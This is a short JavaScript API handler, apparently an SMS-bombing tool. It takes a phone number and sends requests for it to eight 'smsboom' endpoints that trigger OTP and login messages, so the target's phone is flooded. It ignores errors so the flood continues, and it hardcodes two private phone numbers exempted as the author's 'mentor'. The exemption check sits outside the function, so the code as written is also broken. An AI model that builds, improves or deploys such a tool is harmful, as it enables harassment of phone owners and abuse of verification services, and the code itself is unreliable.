const protectedNumbers = [
  "01760432796",
  "01960432796"
];

if (protectedNumbers.includes(number)) {
  return res.status(403).json({
    success: false,
    message: "He is my mentor"
  });
}


export default async function handler(req, res) {
  const { number } = req.query;
  if (!number) {
    return res.status(400).json({ error: "number required" });
  }

  // 🔽 এখানেই API add করবে
  const APIS = [
    "https://smsboom.vercel.app/send-otp",
    "https://smsbooma.vercel.app/verify-phone",
    "https://smsboomc.vercel.app/shikho-send-otp",
    "https://smsboomg.vercel.app/bondi-login",
    "https://smsboomi.vercel.app/bioscope-login",
    "https://smsboomj.vercel.app/send-otp",
    "https://smsboomk.vercel.app/send-otp",
    "https://smsboomm.vercel.app/send-otp"

  ];

  for (const api of APIS) {
    try {
      // যদি number parameter লাগে
      await fetch(`${api}?number=${encodeURIComponent(number)}`);
    } catch (e) {
      // error ignore (tool break হবে না)
    }
  }

  res.json({ ok: true });
}
